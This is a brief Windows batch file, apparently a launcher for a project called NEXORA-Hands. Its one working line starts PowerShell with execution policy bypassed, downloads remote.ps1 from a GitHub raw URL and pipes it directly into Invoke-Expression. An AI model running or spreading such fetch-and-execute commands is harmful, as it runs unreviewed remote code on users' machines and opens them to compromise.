@echo off
setlocal
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/nexora-kz/NEXORA-Hands/dbc74dc/remote.ps1 | iex"
if errorlevel 1 pause
